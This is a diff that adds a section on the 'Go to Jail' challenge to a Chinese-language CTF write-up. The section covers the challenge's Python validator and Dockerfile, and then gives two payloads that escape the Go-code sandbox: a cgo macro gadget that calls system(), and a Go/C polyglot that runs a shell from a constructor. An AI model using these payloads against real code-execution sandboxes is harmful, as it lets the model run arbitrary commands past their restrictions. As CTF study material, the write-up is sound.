@@ -460,6 +460,123 @@ jsfuck 一般需要 6 种字符，所以题目在考如何利用原型链污染�
 
 ## Go to Jail
 
+### challenge  description
+
+题面很简单，接受一段 Go 代码，然后 `go run`，但是只能出现一个左圆括号 `(` 和一个左花括号 `{`。
+
+```python
+#!/usr/bin/python3
+import sys
+import subprocess
+import tempfile
+
+print(
+    """
+ʕ◔ϖ◔ʔ Go Language Jail Challenge ʕ◔ϖ◔ʔ
+
+Input your program (the last line must start with __EOF__):
+    """.strip(),
+    flush=True,
+)
+
+# Input
+code = ""
+while True:
+    line = sys.stdin.readline()
+    if line.startswith("__EOF__"):
+        break
+    code += line
+
+# Validation
+if len(code) > 170:
+    print("Too long code")
+    exit(1)
+if code.count("(") > 1:
+    print("Don't use `(` except in `func main() { ... }`")
+    exit(1)
+if code.count("{") > 1:
+    print("Don't use `{` except in `func main() { ... }`")
+    exit(1)
+
+# Run
+with tempfile.TemporaryDirectory() as dirname:
+    filename = "main.go"
+    open(f"{dirname}/{filename}", "w").write(code)
+
+    try:
+        proc = subprocess.run(
+            ["go", "run", filename],
+            cwd=dirname,
+            timeout=15,
+            capture_output=True,
+            env={
+                "PATH": "/usr/local/go/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+                "HOME": dirname,
+            },
+        )
+        print(proc.stdout.decode() if proc.returncode == 0 else ":(")
+        print("Executed")
+    except subprocess.TimeoutExpired:
+        print("Timeout")
+    except Exception:
+        print("Error")
+
+```
+
+ flag 在当前目录，文件名被处理过：
+
+```dockerfile
+COPY flag.txt .
+RUN mv flag.txt /flag-$(md5sum flag.txt | cut -c-32).txt
+COPY --chmod=555 app.py run
+```
+
+
+
+### solution 1: cgo macro gadget
+
+go 代码要正常运行，main 函数是必要的，这样括号已经用完了。
+
+考虑用 cgo 引入汇编：
+
+```go
+package main
+/*
+#include <asm/vm86.h>
+#define _BITUL asm
+#define X86_CR0_PE_BIT "X:.int 26739;.xdef free;free:lea X,%rdi;jc system"
+X86_CR0_PE;
+*/
+import "C"
+func main(){}
+```
+
+`X86_CR0_PE` 定义在 asm/processor-flags.h 中：
+
+```c
+#define X86_CR0_PE		_BITUL(X86_CR0_PE_BIT)
+```
+
+在一般 C 语言代码中，无法在全局上下文中直接调用 asm，但是在 cgo 里竟然可以。
+
+
+### solution 2:  polyglot of Go and C
+
+官方解法：利用注释以及自引用构造一个很离谱的东西：
+
+```go
+//\
+package main
+/*#define main
+#include"main.go"
+__attribute__ func func constructor))f func)<%system func"sh");}*///\
+import "C"//\
+/*
+#define/**/func main(//\
+){}
+```
+
+真是醉了，什么鬼东西。
 
 
 ## double-parser
